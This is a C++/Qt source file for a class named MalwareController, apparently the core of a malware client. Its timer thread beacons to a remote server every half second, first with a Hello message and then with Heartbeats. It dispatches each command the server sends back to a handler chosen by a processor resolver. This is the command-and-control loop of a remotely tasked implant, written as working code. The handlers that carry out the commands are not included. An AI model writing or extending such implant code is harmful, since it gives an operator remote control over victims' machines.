#include "../SharedKernel/Network/Http/httpserveradapter.h"
#include "../Network/Messages/Client/heartbeatmessage.h"
#include "../Network/Messages/Client/hellomessage.h"
#include "../Processors/processorresolver.h"
#include "malwarecontroller.h"

using namespace network::messages::client;
using namespace network::http;
using namespace processors;

namespace controllers
{
    MalwareController::MalwareController()
        : thread_(this),
          serverAdapter_(std::make_unique<HttpServerAdapter>()),
          processorResolver_(std::make_unique<ProcessorResolver>())
    {
        moveToThread(&thread_);

        connect(&thread_, SIGNAL(started()), &timer_, SLOT(start()));
        connect(&thread_, SIGNAL(finished()), &timer_, SLOT(stop()));

        timer_.setInterval(500);
        timer_.moveToThread(&thread_);
        connect(&timer_, SIGNAL(timeout()), this, SLOT(onTick()));

        serverAdapter_->moveToThread(&thread_);
        QObject::connect(serverAdapter_.get(), SIGNAL(receive(std::shared_ptr<network::messages::server::ServerMessage>)), this, SLOT(onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage>)));
        QObject::connect(serverAdapter_.get(), SIGNAL(serverReplied()), this, SLOT(onServerReplied()));

        processorResolver_->moveToThread(&thread_);
    }

    bool MalwareController::isStarted()
    {
        return thread_.isRunning();
    }

    void MalwareController::start()
    {
        thread_.start();
    }

    void MalwareController::stop()
    {
        thread_.quit();
    }

    void MalwareController::onTick()
    {
        if(!hasEmittedHello_)
        {
            serverAdapter_->send(HelloMessage());
        }
        else
        {
            serverAdapter_->send(HeartbeatMessage());
        }
    }

    void MalwareController::onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage> message)
    {
        std::shared_ptr<MessageProcessorBase> processor = processorResolver_->resolve(message);
        processor.get()->process(message, *serverAdapter_.get());
    }

    void MalwareController::onServerReplied()
    {
        hasEmittedHello_ = true;
    }
}
